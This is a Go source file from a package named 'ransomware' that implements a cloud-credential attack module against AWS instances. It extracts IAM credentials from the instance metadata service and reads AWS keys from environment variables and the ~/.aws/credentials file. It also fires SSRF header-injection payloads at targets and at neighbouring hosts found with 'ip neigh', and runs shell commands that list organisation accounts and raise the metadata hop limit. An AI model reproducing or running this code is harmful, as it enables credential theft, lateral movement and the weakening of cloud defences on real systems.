package ransomware

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type IMDSv2Bypass struct {
	config       *RansomwareConfig
	httpClient   *http.Client
	metadataURL  string
	token        string
}

const (
	IMDSBaseURL = "http://169.254.169.254/latest"
)

func NewIMDSv2Bypass(cfg *RansomwareConfig) *IMDSv2Bypass {
	return &IMDSv2Bypass{
		config:      cfg,
		metadataURL: IMDSBaseURL,
		httpClient: &http.Client{
			Timeout:   5 * time.Second,
			Transport: &http.Transport{},
		},
	}
}

func (i *IMDSv2Bypass) GetIMDSToken() (string, error) {
	req, err := http.NewRequest("PUT", "http://169.254.169.254/latest/api/token", nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")

	resp, err := i.httpClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("IMDSv2 token request failed: %w", err)
	}
	defer resp.Body.Close()

	token, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	i.token = string(token)
	return i.token, nil
}

func (i *IMDSv2Bypass) QueryMetadata(path string) (string, error) {
	req, err := http.NewRequest("GET", IMDSBaseURL+path, nil)
	if err != nil {
		return "", err
	}

	if i.token != "" {
		req.Header.Set("X-aws-ec2-metadata-token", i.token)
	}

	resp, err := i.httpClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("metadata query failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func (i *IMDSv2Bypass) ExtractIAMCredentials() (map[string]string, error) {
	creds := make(map[string]string)

	roleName, err := i.QueryMetadata("/meta-data/iam/security-credentials/")
	if err != nil {
		return i.fallbackCredentialExtraction()
	}

	roleName = strings.TrimSpace(roleName)
	credsData, err := i.QueryMetadata("/meta-data/iam/security-credentials/" + roleName)
	if err != nil {
		return i.fallbackCredentialExtraction()
	}

	creds["role"] = roleName
	creds["raw"] = credsData

	for _, key := range []string{"AccessKeyId", "SecretAccessKey", "Token", "Expiration"} {
		if start := findInString(credsData, fmt.Sprintf("\"%s\" : \"", key)); start >= 0 {
			start += len(fmt.Sprintf("\"%s\" : \"", key))
			end := findInString(credsData[start:], "\"")
			if end >= 0 {
				creds[strings.ToLower(key)] = credsData[start : start+end]
			}
		}
	}

	return creds, nil
}

func (i *IMDSv2Bypass) fallbackCredentialExtraction() (map[string]string, error) {
	creds := make(map[string]string)

	envKeys := []string{
		"AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
		"AWS_DEFAULT_REGION", "AWS_REGION",
	}

	for _, key := range envKeys {
		if val := os.Getenv(key); val != "" {
			creds[key] = val
		}
	}

	if runtime.GOOS == "windows" {
		home := os.Getenv("USERPROFILE")
		credFile := home + "\\.aws\\credentials"
		if data, err := os.ReadFile(credFile); err == nil {
			creds["aws_credentials_file"] = string(data)
		}
	} else {
		home := os.Getenv("HOME")
		credFile := home + "/.aws/credentials"
		if data, err := os.ReadFile(credFile); err == nil {
			creds["aws_credentials_file"] = string(data)
		}
	}

	return creds, nil
}

func (i *IMDSv2Bypass) SSRFExploit(targetURL string) (string, error) {
	ssrfPayloads := []string{
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		"http://localhost:80/latest/meta-data/",
		"http://0.0.0.0/latest/meta-data/",
		"file:///proc/self/environ",
	}

	for _, payload := range ssrfPayloads {
		req, err := http.NewRequest("GET", targetURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Host", "169.254.169.254")
		req.Header.Set("X-Forwarded-Host", "169.254.169.254")
		req.Header.Set("X-Original-URL", payload)
		req.Header.Set("X-Rewrite-URL", payload)

		resp, err := i.httpClient.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		if len(body) > 0 && (strings.Contains(string(body), "AccessKeyId") ||
			strings.Contains(string(body), "ami-id")) {
			return string(body), nil
		}
	}

	return "", fmt.Errorf("SSRF exploit failed on %s", targetURL)
}

func (i *IMDSv2Bypass) AssumeRoleViaSTS(roleName string) (string, error) {
	req, err := http.NewRequest("GET", IMDSBaseURL+"/meta-data/iam/security-credentials/"+roleName, nil)
	if err != nil {
		return "", err
	}

	if i.token != "" {
		req.Header.Set("X-aws-ec2-metadata-token", i.token)
	}

	resp, err := i.httpClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func (i *IMDSv2Bypass) LateralToNeighborInstances() ([]string, error) {
	if runtime.GOOS != "linux" {
		return nil, fmt.Errorf("neighbor scan requires Linux")
	}

	cmd := exec.Command("ip", "neigh")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return nil, err
	}

	var neighbors []string
	for _, line := range strings.Split(string(out), "\n") {
		fields := strings.Fields(line)
		if len(fields) >= 1 && strings.Count(fields[0], ".") == 3 && fields[0] != "169.254.169.254" {
			neighbors = append(neighbors, fields[0])
		}
	}

	return neighbors, nil
}

func (i *IMDSv2Bypass) ExploitNeighborInstances() (int, error) {
	neighbors, err := i.LateralToNeighborInstances()
	if err != nil {
		return 0, err
	}

	exploited := 0
	for _, neighbor := range neighbors {
		resp, err := i.SSRFExploit("http://" + neighbor + "/")
		if err == nil && resp != "" {
			exploited++
		}
	}

	return exploited, nil
}

func (i *IMDSv2Bypass) FullIMDSSuite() map[string]interface{} {
	result := make(map[string]interface{})

	detected := i.DetectAWS()
	result["aws_detected"] = detected

	if detected {
		token, err := i.GetIMDSToken()
		if err != nil {
			result["imdsv2"] = fmt.Sprintf("error: %v", err)
		} else {
			result["imdsv2_token"] = token[:minIMDS(16, len(token))] + "..."
		}

		creds, err := i.ExtractIAMCredentials()
		if err != nil {
			result["iam_extraction"] = fmt.Sprintf("error: %v", err)
		} else {
			result["iam_role"] = creds["role"]
			result["iam_keys_found"] = (creds["accesskeyid"] != "")
		}
	}

	neighbors, _ := i.LateralToNeighborInstances()
	result["neighbor_instances"] = len(neighbors)

	return result
}

func (i *IMDSv2Bypass) DetectAWS() bool {
	_, err := i.GetIMDSToken()
	if err == nil {
		return true
	}

	req, _ := http.NewRequest("GET", "http://169.254.169.254/latest/meta-data/", nil)
	resp, err := i.httpClient.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == 200
}

func (i *IMDSv2Bypass) ScanCrossAccountRoles(orgID string) ([]string, error) {
	psScript := `
aws organizations list-accounts --query 'Accounts[*].Id' --output text 2>/dev/null
`
	_ = orgID

	cmd := exec.Command("/bin/sh", "-c", psScript)
	out, _ := cmd.CombinedOutput()

	accounts := strings.Fields(string(out))
	return accounts, nil
}

func (i *IMDSv2Bypass) BypassIMDSHopLimit() error {
	psScript := `
aws ec2 modify-instance-metadata-options \
    --instance-id $(curl -s http://169.254.169.254/latest/meta-data/instance-id) \
    --http-put-response-hop-limit 2 \
    --http-endpoint enabled 2>/dev/null
`
	cmd := exec.Command("/bin/sh", "-c", psScript)
	cmd.Run()
	return nil
}

func findInString(s, substr string) int {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func minIMDS(a, b int) int {
	if a < b {
		return a
	}
	return b
}

var _ = io.ReadAll
